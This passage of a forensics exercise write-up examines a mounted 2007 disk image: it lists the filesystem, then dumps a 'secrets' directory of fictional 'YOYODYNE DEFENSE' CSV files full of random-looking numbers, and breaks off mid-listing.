<label class="org-src-name"><span class="listing-number">Listing 11: </span>Commands</label><pre class="src src-sh">ls -la /images/sda1
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 12: </span>Results</label><pre class="src src-text">total 116
drwxr-xr-x 21 root root     4096 2007-09-10 03:07 .
drwxr-xr-x  6 root root     4096 2007-09-15 10:49 ..
drwxr-xr-x  2 root root     4096 2007-09-10 03:00 bin
drwxr-xr-x  2 root root     4096 2007-09-09 19:50 boot
drwxr-xr-x  2 root root     4096 2007-09-09 19:49 cdrom
drwxr-xr-x  9 root root    24576 2007-09-10 04:32 dev
drwxr-xr-x 39 root root     4096 2007-09-10 04:32 etc
drwxr-xr-x  2 root root     4096 2007-09-09 19:49 floppy
drwxrwsr-x  9 root staff    4096 2007-09-10 04:21 home
drwxr-xr-x  2 root root     4096 2007-09-09 19:49 initrd
drwxr-xr-x  5 root root     4096 2007-09-10 02:59 lib
drwx------  2 root root    16384 2007-09-09 19:46 lost+found
drwxr-xr-x  2 root root     4096 2002-02-08 07:42 mnt
drwxr-xr-x  2 root root     4096 2007-09-09 19:49 opt
drwxr-xr-x  2 root root     4096 2002-02-08 07:42 proc
drwxr-xr-x  3 root root     4096 2007-09-10 04:23 root
drwxr-xr-x  2 root root     4096 2007-09-10 02:59 sbin
drwxrws---  4 root libuuid  4096 2007-09-10 03:07 secrets
drwxrwxrwt  2 root root     4096 2007-09-10 04:22 tmp
drwxr-xr-x 12 root root     4096 2007-09-09 19:49 usr
drwxr-xr-x 13 root root     4096 2007-09-09 19:49 var
lrwxrwxrwx  1 root root       26 2007-09-09 19:46 vmlinuz -&gt; boot/vmlinuz-2.2.20-idepci
</pre>
</div>
</div>
</div>

<div id="outline-container-org6d15b31" class="outline-4">
<h4 id="org6d15b31"><span class="section-number-4">4.2.7</span> Look into <code>secrets</code></h4>
<div class="outline-text-4" id="text-4-2-7">
<p>
List whats in the secret directory.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 13: </span>Commands</label><pre class="src src-sh">sudo ls -lRa /images/sda1/secrets
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 14: </span>Results</label><pre class="src src-text">/images/sda1/secrets:
total 16
drwxrws---  4 root libuuid 4096 2007-09-10 03:07 .
drwxr-xr-x 21 root root    4096 2007-09-10 03:07 ..
drwxrwx---  2 root libuuid 4096 2007-09-10 03:07 numbers
drwxrwx---  2 root libuuid 4096 2007-09-10 04:19 other

/images/sda1/secrets/numbers:
total 552
drwxrwx--- 2 root libuuid 4096 2007-09-10 03:07 .
drwxrws--- 4 root libuuid 4096 2007-09-10 03:07 ..
-rw-r----- 1 root libuuid 6212 2007-09-10 03:07 100.csv
-rw-r----- 1 root libuuid  721 2007-09-10 03:07 10.csv
-rw-r----- 1 root libuuid  782 2007-09-10 03:07 11.csv
-rw-r----- 1 root libuuid  843 2007-09-10 03:07 12.csv
-rw-r----- 1 root libuuid  904 2007-09-10 03:07 13.csv
-rw-r----- 1 root libuuid  965 2007-09-10 03:07 14.csv
-rw-r----- 1 root libuuid 1026 2007-09-10 03:07 15.csv
-rw-r----- 1 root libuuid 1087 2007-09-10 03:07 16.csv
-rw-r----- 1 root libuuid 1148 2007-09-10 03:07 17.csv
-rw-r----- 1 root libuuid 1209 2007-09-10 03:07 18.csv
-rw-r----- 1 root libuuid 1270 2007-09-10 03:07 19.csv
-rw-r----- 1 root libuuid  171 2007-09-10 03:07 1.csv
-rw-r----- 1 root libuuid 1331 2007-09-10 03:07 20.csv
-rw-r----- 1 root libuuid 1392 2007-09-10 03:07 21.csv
-rw-r----- 1 root libuuid 1453 2007-09-10 03:07 22.csv
-rw-r----- 1 root libuuid 1514 2007-09-10 03:07 23.csv
-rw-r----- 1 root libuuid 1575 2007-09-10 03:07 24.csv
-rw-r----- 1 root libuuid 1636 2007-09-10 03:07 25.csv
-rw-r----- 1 root libuuid 1697 2007-09-10 03:07 26.csv
-rw-r----- 1 root libuuid 1758 2007-09-10 03:07 27.csv
-rw-r----- 1 root libuuid 1819 2007-09-10 03:07 28.csv
-rw-r----- 1 root libuuid 1880 2007-09-10 03:07 29.csv
-rw-r----- 1 root libuuid  232 2007-09-10 03:07 2.csv
-rw-r----- 1 root libuuid 1941 2007-09-10 03:07 30.csv
-rw-r----- 1 root libuuid 2002 2007-09-10 03:07 31.csv
-rw-r----- 1 root libuuid 2063 2007-09-10 03:07 32.csv
-rw-r----- 1 root libuuid 2124 2007-09-10 03:07 33.csv
-rw-r----- 1 root libuuid 2185 2007-09-10 03:07 34.csv
-rw-r----- 1 root libuuid 2246 2007-09-10 03:07 35.csv
-rw-r----- 1 root libuuid 2307 2007-09-10 03:07 36.csv
-rw-r----- 1 root libuuid 2368 2007-09-10 03:07 37.csv
-rw-r----- 1 root libuuid 2429 2007-09-10 03:07 38.csv
-rw-r----- 1 root libuuid 2490 2007-09-10 03:07 39.csv
-rw-r----- 1 root libuuid  293 2007-09-10 03:07 3.csv
-rw-r----- 1 root libuuid 2551 2007-09-10 03:07 40.csv
-rw-r----- 1 root libuuid 2612 2007-09-10 03:07 41.csv
-rw-r----- 1 root libuuid 2673 2007-09-10 03:07 42.csv
-rw-r----- 1 root libuuid 2734 2007-09-10 03:07 43.csv
-rw-r----- 1 root libuuid 2795 2007-09-10 03:07 44.csv
-rw-r----- 1 root libuuid 2856 2007-09-10 03:07 45.csv
-rw-r----- 1 root libuuid 2917 2007-09-10 03:07 46.csv
-rw-r----- 1 root libuuid 2978 2007-09-10 03:07 47.csv
-rw-r----- 1 root libuuid 3039 2007-09-10 03:07 48.csv
-rw-r----- 1 root libuuid 3100 2007-09-10 03:07 49.csv
-rw-r----- 1 root libuuid  354 2007-09-10 03:07 4.csv
-rw-r----- 1 root libuuid 3161 2007-09-10 03:07 50.csv
-rw-r----- 1 root libuuid 3222 2007-09-10 03:07 51.csv
-rw-r----- 1 root libuuid 3283 2007-09-10 03:07 52.csv
-rw-r----- 1 root libuuid 3344 2007-09-10 03:07 53.csv
-rw-r----- 1 root libuuid 3405 2007-09-10 03:07 54.csv
-rw-r----- 1 root libuuid 3466 2007-09-10 03:07 55.csv
-rw-r----- 1 root libuuid 3527 2007-09-10 03:07 56.csv
-rw-r----- 1 root libuuid 3588 2007-09-10 03:07 57.csv
-rw-r----- 1 root libuuid 3649 2007-09-10 03:07 58.csv
-rw-r----- 1 root libuuid 3710 2007-09-10 03:07 59.csv
-rw-r----- 1 root libuuid  415 2007-09-10 03:07 5.csv
-rw-r----- 1 root libuuid 3771 2007-09-10 03:07 60.csv
-rw-r----- 1 root libuuid 3832 2007-09-10 03:07 61.csv
-rw-r----- 1 root libuuid 3893 2007-09-10 03:07 62.csv
-rw-r----- 1 root libuuid 3954 2007-09-10 03:07 63.csv
-rw-r----- 1 root libuuid 4015 2007-09-10 03:07 64.csv
-rw-r----- 1 root libuuid 4076 2007-09-10 03:07 65.csv
-rw-r----- 1 root libuuid 4137 2007-09-10 03:07 66.csv
-rw-r----- 1 root libuuid 4198 2007-09-10 03:07 67.csv
-rw-r----- 1 root libuuid 4259 2007-09-10 03:07 68.csv
-rw-r----- 1 root libuuid 4320 2007-09-10 03:07 69.csv
-rw-r----- 1 root libuuid  476 2007-09-10 03:07 6.csv
-rw-r----- 1 root libuuid 4381 2007-09-10 03:07 70.csv
-rw-r----- 1 root libuuid 4442 2007-09-10 03:07 71.csv
-rw-r----- 1 root libuuid 4503 2007-09-10 03:07 72.csv
-rw-r----- 1 root libuuid 4564 2007-09-10 03:07 73.csv
-rw-r----- 1 root libuuid 4625 2007-09-10 03:07 74.csv
-rw-r----- 1 root libuuid 4686 2007-09-10 03:07 75.csv
-rw-r----- 1 root libuuid 4747 2007-09-10 03:07 76.csv
-rw-r----- 1 root libuuid 4808 2007-09-10 03:07 77.csv
-rw-r----- 1 root libuuid 4869 2007-09-10 03:07 78.csv
-rw-r----- 1 root libuuid 4930 2007-09-10 03:07 79.csv
-rw-r----- 1 root libuuid  537 2007-09-10 03:07 7.csv
-rw-r----- 1 root libuuid 4991 2007-09-10 03:07 80.csv
-rw-r----- 1 root libuuid 5052 2007-09-10 03:07 81.csv
-rw-r----- 1 root libuuid 5113 2007-09-10 03:07 82.csv
-rw-r----- 1 root libuuid 5174 2007-09-10 03:07 83.csv
-rw-r----- 1 root libuuid 5235 2007-09-10 03:07 84.csv
-rw-r----- 1 root libuuid 5296 2007-09-10 03:07 85.csv
-rw-r----- 1 root libuuid 5357 2007-09-10 03:07 86.csv
-rw-r----- 1 root libuuid 5418 2007-09-10 03:07 87.csv
-rw-r----- 1 root libuuid 5479 2007-09-10 03:07 88.csv
-rw-r----- 1 root libuuid 5540 2007-09-10 03:07 89.csv
-rw-r----- 1 root libuuid  598 2007-09-10 03:07 8.csv
-rw-r----- 1 root libuuid 5601 2007-09-10 03:07 90.csv
-rw-r----- 1 root libuuid 5662 2007-09-10 03:07 91.csv
-rw-r----- 1 root libuuid 5723 2007-09-10 03:07 92.csv
-rw-r----- 1 root libuuid 5784 2007-09-10 03:07 93.csv
-rw-r----- 1 root libuuid 5845 2007-09-10 03:07 94.csv
-rw-r----- 1 root libuuid 5906 2007-09-10 03:07 95.csv
-rw-r----- 1 root libuuid 5967 2007-09-10 03:07 96.csv
-rw-r----- 1 root libuuid 6028 2007-09-10 03:07 97.csv
-rw-r----- 1 root libuuid 6089 2007-09-10 03:07 98.csv
-rw-r----- 1 root libuuid 6150 2007-09-10 03:07 99.csv
-rw-r----- 1 root libuuid  659 2007-09-10 03:07 9.csv
-rw-r----- 1 root libuuid   45 2007-09-10 03:07 NOTICE

/images/sda1/secrets/other:
total 52
drwxrwx--- 2 root libuuid  4096 2007-09-10 04:19 .
drwxrws--- 4 root libuuid  4096 2007-09-10 03:07 ..
-rw-r--r-- 1 1003    1003 20480 2007-09-10 04:19 newsecret.data
-rw-r----- 1 root libuuid  4096 2007-09-10 03:07 secret2.data
-rw-r----- 1 root libuuid 16384 2007-09-10 03:07 secret3.data
-rw-r----- 1 root libuuid  2048 2007-09-10 03:07 secret.data
</pre>
</div>

<p>
Looks like the secret numbers are here.
</p>

<p>
Look at the files.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 15: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/secrets -print -type f -name <span style="color: #CC9393;">'*'</span> -exec tail -n 7 {} <span style="color: #CC9393;">\;</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 16: </span>Results</label><pre class="src src-text">/images/sda1/secrets
/images/sda1/secrets/numbers
/images/sda1/secrets/numbers/1.csv
YOYODYNE DEFENSE (TOP SECRET)
SECRET NUMERICAL DATA SHEET NAME '1'
Sat Sep  8 18:12:37 PDT 2007

22440   23188   14913   16765    8900   32617   17809   28071   14572    4917

END OF LINE
/images/sda1/secrets/numbers/2.csv
SECRET NUMERICAL DATA SHEET NAME '2'
Sat Sep  8 18:12:37 PDT 2007

24257   25887   15416   31127   20809   20186   12903   11550   30932   20390
27185   19238   31534   24433    5351   21139   15636    7465    2069   20359

END OF LINE
/images/sda1/secrets/numbers/3.csv
Sat Sep  8 18:12:37 PDT 2007

10145   12876   16045    8119   27503   29224   14961   15476   18615   31540
12393   13350   15889    3176   28273   12250   12011   14985   18925   27115
16095   24154   28805   22029    1745   14722    2208   15894   32716   32316

END OF LINE
/images/sda1/secrets/numbers/4.csv

12870   16923   16799   13278   28983   26962   23985    7079   10387    5598
20857   25945    3667   16989   29566   27797    1106   17457   12938    9009
22149    4875   13389    8607    8440   32060   16816   21023    6540   21691
 7418    8868   14706   24821    7590   27016     614    8536   11774   26863

END OF LINE
/images/sda1/secrets/numbers/5.csv
32435    5262   17679   13836   25248   13400    7206   19128    6249    8101
19809   24255   27639     337    9228    2245   15691   14878   16876   31575
 1905   15150   28171   14794   27173    3135    1092   16084    8770   31140
20877   28903    7406    9735   26887      81    4487   31712   15815    2837
20044   15028    3426    8839    9163    7182   26426    3753    6926   19518

END OF LINE
/images/sda1/secrets/numbers/6.csv
 9249    8280   22266   18755      29    1129   22997    7250   30739   29278
20900   22213    7616    7822   25176   26251   20570    1077    6637   27896
31577   19032   27150   29943   30217    6748    4232   20750   20433   17509
 6769   23831    5440   19823   28181    8120   23005   17199    1955    1959
 4779   29095   21660   16543    3454   22156   23031   23585    4352   28247

END OF LINE
/images/sda1/secrets/numbers/7.csv
13596   26062   17260   20457    2450    3105    9714    8770     141   11958
 6751   12022    8403   19909   17579   14248   32618    8418   25628    5343
16410    5062    7707    7605    8615   17367    6867   24133    4555   19068
20367   18642    1269   24611    4816   19896    3524    9231   22065    1555
28738    5346    8699   23857   11489    1518   11912   25784   16182    7484

END OF LINE
/images/sda1/secrets/numbers/8.csv
11934    7875   16699   12401   21741   22582   24107   27484   31400   31875
16200   24257   10225    4953   16002    2156   10782   24556   14725    5311
 4918   28873   29586    4449   13612   24666   14618    7846    5337    4665
 8479   19388    4283   31029    2123    2459   14191   12837    8653   24746
 2544   32623   14839   21810    9613   29014    1688    9860    4524   18183

END OF LINE
/images/sda1/secrets/numbers/9.csv
 6139   15881   12994   11865   17575   28021    1981   18468   32466   26223
23969   27020    8305   21592   29840    3700   23545   19429   19704    4808
 9132   28281   15809    2873   14758   26431   16699   28086   13478    7691
 9418   17833    1437   15342    1871   28662   18936   23963   21077    6836
30382    3965    6656    1193   10248   28564    4022   14472    8756    4371

END OF LINE
/images/sda1/secrets/numbers/10.csv
11985   13082    2963   10504   20734   22532   30304   11213   32398    1986
30696   32024   10509    4926   16626    7900   19435    5995   30658   21852
 2023    4678   28522   23181    2361   19342    2006   27433    9346    3394
  661    2451   22132   26591   22631    4718    4673   32342   23436   32507
 2756    5583   12999   28982   25202   25888   31028   26032   28159   24588

END OF LINE
/images/sda1/secrets/numbers/11.csv
 7637   30618   21151    4419    7727   12399   22399   12101   27424    1695
13125   25925   30557   12558   11084    1053   16432   20269    2098    7858
17614   17195   25244   32259    6009     730   32685   18934   25686    2913
31043   29405    2572   25511   11767   10187    8224   22907   13523   26010
 1811   25987   20690   27319   24121   25067    8216    7092   31575   32713

END OF LINE
/images/sda1/secrets/numbers/12.csv
 9959   16039    7542   16242   28040    6563   29447    2472   32102   20226
15708   15428   15992   18199   25917   16600   22521    7014   15506   13894
16135   22292   21590   21772    4862   21005   13914   19541   25489    4855
32447   25531   15532   25562    4401   28125    5133    1420   26083   22437
29852   11741   10831   24662     911   15495   12715   18008   15167   21204

END OF LINE
/images/sda1/secrets/numbers/13.csv
27708   29920   27145   17178   16820   19560    6951   29352   25664   32680
23568   17011    4517   17767    4484   25574   15328   15934   31287   26661
30162    8658   14688   26020   32424     974   32256   23429    6156   27811
21235   28342    4877   16895   25528   23751   16335   15118   16896   16524
11250   23667   30712    1142   23491   14341   29526    7858   27173   27722

END OF LINE
/images/sda1/secrets/numbers/14.csv
20574   13562   16889   13494   10635   23894   12468   12088   30919   25890
27725    8137   18156   28692    9887    9151   24051    7585    4560   16067
 7674   26388   31294   19533    5911   17264    4904    3298   29663   11531
25117   19213     180   25831   29989   21535   23506    4047   20400   16550
 6681    2358   14914   18606   27800    1999   24796    8122    4829   28651

END OF LINE
/images/sda1/secrets/numbers/15.csv
25136   23967   25938     812    2325   19886   13285   19422   21297   19973
21938    5879   24547   32576    7596   28804   11191   15315   20700    6226
 5034   16529    4605   23390   20509   20986   27350    6142    9109   27207
 3931   22736   14648   15415   13955   12902   28423    5783    9448   20398
 2012   29844   17696   22819     291   18112   27101    8885    2136   16614

END OF LINE
/images/sda1/secrets/numbers/16.csv
31258   32353   17402   23256   30583   25603    2428   18401   22775     610
16538   15613   11217   26588   27819   12694    8290   14143   26066   26926
29933   25038   14366   31312   20499   30229   22626   22583   18192    3949
19157   19263    3003   12877    5994    1039   32316    8535   10222   13700
 7818   30494   27619   24924    6572    4281   24094   17319   28331    5385

END OF LINE
/images/sda1/secrets/numbers/17.csv
26861   16468   20017    2657   19151   29429   31862   28049    5735   15707
19150    9263   14068     760   14663   21212    7405   25752   31064   12072
13589    6275   31185   31511   17476   10324   17795   15448   13295   12444
 8367   11071    7036   32310    4399    5511    4680    9576   15718   12490
 5748   28350   19945    6332    5235   13735   15850   29995   23380    5324

END OF LINE
/images/sda1/secrets/numbers/18.csv
 4350    8180   13754   22064   29215   18618   15528   15291   15295   12000
18076   23646    3937   13184    1967   13200   16307   29622   11356   12847
 7219   26843   23312    3867   19358   20604   17011    1425   24861    6172
16505    7497    6191   18606   28199   22607   25429   11729    7205   25251
14719   13513    3081    8079   20025   16193   29277   12490    8341   26051

END OF LINE
/images/sda1/secrets/numbers/19.csv
32618    5840   19564   23431   25005    9665   27852   18292    4405   14908
 4376   12273   10910    5132   18682   16790   28321   25635   22993   19199
17969    5262   17964   13472   27735    8986   20740   10571   22990   31428
30909   15234   20062   30690    9691    4990    5113     786    2436   29180
22423   28390   26554    5066   13265    1100   18773   16917   18751   27070

END OF LINE
/images/sda1/secrets/numbers/20.csv
30909    2558    6689     275   19501    7932    4819   16262   31869    5380
  848    7496   15254    6288   13184   15913   20287   10864    4389   10106
20554   28043    4332   14884   12416    5203    5173   12933   13134   10761
24482   18958   17708   13238   28257   22173   24017   25829   11834     923
22808   25633   28759     213   29360   23345    6871   17179   20614   20246

END OF LINE
/images/sda1/secrets/numbers/21.csv
16496    9729   12544   31872   31401   22840   19833   11157   18556   21553
10199    8083   21370   31846   15142    5416    5233   25080   23831   25111
26541    9526    8862   21410   10482   10479   29261    1972    4916    7544
24686   11474   24604   12412   12515   21696   25404   28038    6846   17907
 7436    6992   10656   30650     428    8649   22738    9514   28504   17640

END OF LINE
/images/sda1/secrets/numbers/22.csv
19340   10050   22052   29600    8013   11336    1022   16384   26445   28687
20142    8233   16728   11416   21852   31044    4814   14121   10520    1630
19523   20919   24543   13743   19158   10002   23372    3752   29522   24014
16158   27838   25350   28149   21357    6905   21092    9582   20139    7227
 1372    1836   17245   11345   25974   28950   11671   17851    8626   13497

END OF LINE
/images/sda1/secrets/numbers/23.csv
 5284   15077    8538   16024   29599   18333   16213   29507   28646   15950
 7318   21201   28574    4207   16520   21031     775    9856   23105    5800
19781    9959   29734   24179   11756   20107   13916   12383   30541   14130
25589    4024   15746   10139   32471   12214    2619   18779   15980   25281
  327   24696   17676   16743   16866   24775   16426   17689    4289   32005

END OF LINE
/images/sda1/secrets/numbers/24.csv
20839   12319    3931   16572    4602   22016   23150   13583   20363   28801
18306   18889   23807   18740    4392   15487    1211   17918   26940    5580
24561   15474   32538   12817   22189    7916   15488    6636    5278   24429
25921   26233   32421    9274    1455   11595   29983   10803   23494   12329
28403   28916   10008   19592   14682    3245    2940   26316   26737   14786

END OF LINE
/images/sda1/secrets/numbers/25.csv
11734   21862    7570   11831   32033   25813   15743   26186    9338   14346
31055    3419    2083   19379   27895   16056   17508   14191    9288   10942
 2087   19007    7404   14121   32083     429   27678   22557   23272   18362
 1068   28147   31967    9097   21934   13253    7615   18636   18564    2744
 3583   12786   18577   11788    1311   12557   25145    7141   26757    9093

END OF LINE
/images/sda1/secrets/numbers/26.csv
12303     627   22687   29824   16821    3865    8681    8676   28010   17586
27129    3019    8160   31284   10445   24045    9511   20183    3625   17336
 7917   18854    6194    4280    8823   26058   30667     962   14942    6033
24243    4324   18442    5697    4955   24077     240   30368   26248   24187
  907   25150   26285   14567   16411   30600   27910   25715   12576    7822

END OF LINE
/images/sda1/secrets/numbers/27.csv
 2743   11035    1921   27994    2078   16907    8249    3680   30087    9253
16180    1038   30992    5143    8117    8893    6561    6063   15872   24654
25745   27158   17133   18114   16921   21964    7214   29848    9337   12903
19807   18154   32236     523   17874    2374   10573   27304   18200   18253
12677    1782   10320    7182    9148   19250     559    6944   22587   31126

END OF LINE
/images/sda1/secrets/numbers/28.csv
25859    7466    8059   11686   19816   27294     832    1170   21354   25838
 8091   15751   14648   16269    4441    6220   13298    5582    8792    8010
 2072   27865   27093    4073     179   22891    9587   27818   11589   17745
 5898    5380    4721    4258   29493   32512   14699    2751   11418   28307
18974   32524   10232   18111    7198   20843    9458   20584   27220   26237

END OF LINE
/images/sda1/secrets/numbers/29.csv
 4048    2872   10988     164     283    9611   18493   23106   24613    9507
13236   21516   10856   25218   28861   26616   24952   27257   25510    6297
 4354   21113   24059   15436   14472    1433    5279   20264    5338   22118
23471   30627    1363   24942   17431   10756    2265    3211   30448    5773
 3730   12016   27296   20068    5735   11765   19888   19269   23865    6818

END OF LINE
/images/sda1/secrets/numbers/30.csv
20532   31875   16292   31189    5617   13549   23900   25621   27197   16677
 8046   16212    2796    7949   29621   24317    5070   26715    4347   12559
17543    6472   30262   12968   18480    5630    8582    8533   23210    6846
15082   29979   26566     724   11974   28484      23    4668   29717   18923
16273   11794   31342   21575     490   12218   31672    1975     173   16083

END OF LINE
/images/sda1/secrets/numbers/31.csv
16973   23447    6468   14563    9402    2861   14069   22103    8445   32396
 1191   25594   31392   14955   10345    5463   28408    3781    5507   29458
27813   25975    3286   28904   14312   24222   14353   26475    1960   22190
19352   28027   26434   12882   23349   19843   26899    3080   19836    4729
30151    8056    6656   26771   17504    3735   15928   19914   18182   23680

END OF LINE
/images/sda1/secrets/numbers/32.csv
 7180   22457    4754   30904   25796   10255   28975   21723   10104    8070
 9155       5   22990    6304   12749   31746   30110   19154    6129   16620
26497    1061   22370   13857   23070   24721    4109   16133   27187    6932
 4486   22397    3941   21653    3763   31782   17864   27772   24634   23129
17454   18190     428     992   19248    7561   13678    8821   22782   13315

END OF LINE
/images/sda1/secrets/numbers/33.csv
24643   17604   20144   31226    7285   18289   14526   15472    9457    2211
 4938   29201   19151   24497   32419   26850   28836    8368   22225   22693
  232    2464    5965    8675   28169   22103   16003   29115    6219   10033
27912   22125   13670    9845   15515    4262    5597    6278    2781   11657
25632   17102   13264   13697   14689   21866   30737   31689    9270   17301

END OF LINE
/images/sda1/secrets/numbers/34.csv
20213   14142   16775   12036   18631   26232    2778   12552    4950   19243
17390   13793   12728   20604   25185    7467   10343   23943   28472   17160
 4029   31791   13247    8652   21038    8358   22564   25195    4679   23995
20434    1956   29802    4582   12175    8169   18502   22805   18772   10773
19993   20276   10736    6349    5029   28543   21595    8369    9459    7303

END OF LINE
/images/sda1/secrets/numbers/35.csv
23192   23617   24230   24672   27579   20641     886   12256   25856   11742
11340   14418   31927   30182    3048   19849   31810      38   28475   17561
16002   13695    4018    9778   10501    4105   15940   10943    3052   23178
13114   23618    5277   27573    3777   31214   16174   22818   22065   31105
29324   24081   31259   17000   13167   29150   12565   32401    6654   19012

END OF LINE
/images/sda1/secrets/numbers/36.csv
15503    8505   23277   31621    3569   13364   25614   17801   30531    6351
13102   13671   24664   10826   10507   19305   32722   25895    2423    7914
23576    6772   31407    8319   24598    3032    7803   21221   32696   15456
 8457    9898   10276     519   22922   25756   30650    9223   22666   21234
31180    4578      16     316   25117   32559     377   26378    1051   28709

END OF LINE
/images/sda1/secrets/numbers/37.csv
10202   13646   12543   11874   10514    1736   16737    8078    1794   25418
 1270   22693   24768   21834   12651    7619   32200   19625   10558   32574
20358   28484   22061   16806   32677   22361   15967   18813    5909   23456
16467    1719    2527   15653    8588    7152   13224   22247   23545   15727
 4358   11059   22054     991   16774   27325   29221   11975    7801   20867

END OF LINE
/images/sda1/secrets/numbers/38.csv
20403   12136    1155   31495   28125   13163    5970   26389    3817   29967
18281    3015   25745   20068   10754   22241      67   20248    7208   25736
31625   23152   20225   25503   15161   10501   19679   25573   14688   10815
17157   27083     495     403    7225   25622   20003    7036   14350   24377
27318    5690   19182    4720   21703   31309   13033    8860   14730   32432

END OF LINE
/images/sda1/secrets/numbers/39.csv
 2225   31796   21331   10303   22690   25394   15718   13526   26561   28072
11116    3342   20344   29865   12068    9837   19741    3586    7248   13972
29456   32038    1334   31749   20375   18142     724   18357    9593   21421
17633    4950    4700   19716    9608   12385   16094    8490   15588   23525
29814   23017   12346   17170   13577   12793   14584   17540   12364    5422

END OF LINE
/images/sda1/secrets/numbers/40.csv
14682   23642     491   17762   12744   29905     627    3966    4059    8568
 7489    3789    3833   27825    3317   26098   16799   12924    3688   31835
19228   32127    9937   24621   30995   10457   12186   23279   30894   21159
17408    9464    9123   27474   27757   25497    8424   28063    9109   24075
21813    2932    4434    5399   24381   23403    5952   10632    7085   21272

END OF LINE
/images/sda1/secrets/numbers/41.csv
18291    8308    6332   23902   19027    1287     105    7490   30552    9481
20823   26537   15175   29525   19613    8530    8278    5299   13433   18793
 5002   28679    5899    5010    9169    5434    2263    5817    5855    9960
 2808    7320   28617   13006    6437   24069   17250    9457    7013   14337
30297   16783   14226    9601   16655   20935   16015    2554    5433   28423

END OF LINE
/images/sda1/secrets/numbers/42.csv
22419   20947   20413    1662    8232    6602    4370   20088   28739   16426
25364   15126    2676   15315   23349   18138   28870   16340    2600   28613
16572   11707   20031   20613   21261   24735   28548    8283    6942    7402
24985   17870     579   12519   18256   26641   15030    4623    5129   11061
18003     787   26319     783   11545    3753   31537   18663    8033   25367

END OF LINE
/images/sda1/secrets/numbers/43.csv
16400    4988     125    8725   28915   14002   24804   29336   20124   17156
12030   12471   13484   32116    2909   20948    5845    8571   15806   21906
20297   11534   22370    2098   26596   28754   11788    3760   18968   23838
31704    6301     412   21044   12226   21435   32212   24127   15090   32090
32255   13964   26313   11637    5155   23945   32684   14220   27320   13566

END OF LINE
/images/sda1/secrets/numbers/44.csv
 3646    5987   11016   18644   16509    8254   13445   11785    9773   13753
16857   23121   16729   30536   15646   23678    4033   29802   28325   31357
29266    1138    1753   27643    4199   20242   27091    5076   12994   20908
 6332   25664   21064   27993   21734   22973   22144   18869   22698   14522
16330    6257   16895   31240   14687    1430    2783    4609   20236   24730

END OF LINE
/images/sda1/secrets/numbers/45.csv
13418    1940   11089   26206    4696   18603   29046   23076    4914    6109
26828   28742    3093    1474   28940   19050   21970   18794   10898    9727
13177    4596   15816   11580    5546   22000   11604   23519   18075   15478
 7937   29602   19176   31747   18286   15485     798   19223   25721    3231
23046   16015   29289   21546    2993   12738    2013   10417   20808    5214

END OF LINE
/images/sda1/secrets/numbers/46.csv
 8250   12901   31682   27178   12205   31750   11054    7996   32417   13407
14039   14006   11739   23054   17951   25867   27806    1176   19531   12292
16617   28146   16674    4388    6003    2251   18250   21212   22375   12191
23650    5235   30175   14460   28382    8371   17698   31122   30118     852
31646    2686   25966    2346   11940   20051    8147    5901   15590    4716

END OF LINE
/images/sda1/secrets/numbers/47.csv
28294   22270    8248   32088   11885   15770    8227   14489    7642    7034
17449   30671   28164   28632    2163    8140   12652     505   30999   19997
 2198   13629    9012    2549   24196    4584   31697    6108   28919    3758
22646   23575    8293   26368   21896   30678   17337    2585   18021    3360
31693   28359    2884   21887   17063   22522   26826   30571   12919   22030

END OF LINE
/images/sda1/secrets/numbers/48.csv
18281     429    6886   20108   31091   14029    7054   12566    6854   27802
13514   22023   20617   23406   20010     797   12928   13862   27720    6663
13647   11696   23388   17622   31852    8537   26526   32036   20453    2004
16223   23042   12759   23817   23270   20643   20394    8355    1547   21449
19213   12632   26517   32243    5813    4343    8789   12867   25301   23859

END OF LINE
/images/sda1/secrets/numbers/49.csv
 2774   16822   10171    6669   19017   30357   25241    8663   16011   16836
30681   21207   26988   12634    6618    4958   26068   21445   16380     620
17483   18274   21521   13990    9284   10207   19076   28949    5676   30033
 4423   16292    4663   20756     382   19288    4069   11366   16365   20045
 2646   17602   14370   28020   32083    2558    7778   29198   10008   18979

END OF LINE
/images/sda1/secrets/numbers/50.csv
 8214   19339   19094   11403   11729   19942   15964    3577    5802   31977
 2705   14055   29170   25173    7874   23981   22873   26817   25307   15011
 4121   29020   16433    2618   28898    2401   12107    5337   20104   31576
22131   22649   13167   14355    1281   12287   11186   21348    5986    5213
 1558    4255    4075   21351   14257   15059   28768   22646   20058   17607

END OF LINE
/images/sda1/secrets/numbers/51.csv
 4657   10385    2938   24598   19040   29198   31784    1958   27671    9153
18306   18046   29059   10599   25824   19217     134   27550    3751   25685
20566    6998   18242   26893   19669   18423   12769   18388    5038   11346
15092    3048   10035   24138   19558   25276   29433   19775    2458   28220
32305   15165   20262   28638   26565    7401   29266    6253    2102    3111

END OF LINE
/images/sda1/secrets/numbers/52.csv
14211   16139    9774   11928   23929    4201     920   12467      72    2372
30718    3416   29595      99   21710   20965   12527   20318    7163    4612
17135    4292   24764   24504    2701    5391   30729   14376   14820   14920
13526   28974    8401    4730   11278   29599   10059    1240   15438   20056
 4486   21933   21862   28173   27084   16648   15248    1489   11286    5155

END OF LINE
/images/sda1/secrets/numbers/53.csv
19820   11905   14459   32277    7405   19913   10461   27138   12361   17778
 7686    7987   15493   22449   29223   20940   32656    6451   24378   10477
17459    1169    4815   21643   14519   18833   12948    9485    1107   21538
 7591     166   18268   18198   30364   21109   29227   26269   16973   20318
 7885   11909   10084   11430   22893    4148    6825    9297     898    5217

END OF LINE
/images/sda1/secrets/numbers/54.csv
19513   14131   14989   17975     819    6387    2446   28766   31131   14890
11335   30053    9505   13841    3520    7872    5167   30986   24646    7557
 8369    2430   11034   17573     936     629    1756   10986    5486    7158
13493   28848   18119   23844   31815    9571    7851   21525   31830    2236
18645   28529   23091    9146     267   21967   31724   30051   26412   22223

END OF LINE
/images/sda1/secrets/numbers/55.csv
17866    8476   30746   22144   29577   29287    8809   13466   25619   28185
 4494   19988   29288    2883    4395   28569   22455   13882   25186    2891
15791   17134   29951   30850   10628   10507    1892   29509    3011   26065
22840    6020     215    8116   23759   21531    3671   26547    4952    4487
26901   13432   32712    2150    4071   29492   23690     945   18227   19000

END OF LINE
/images/sda1/secrets/numbers/56.csv
  619    4778   14774   20961    7855   23741   10387   16777   12119   31392
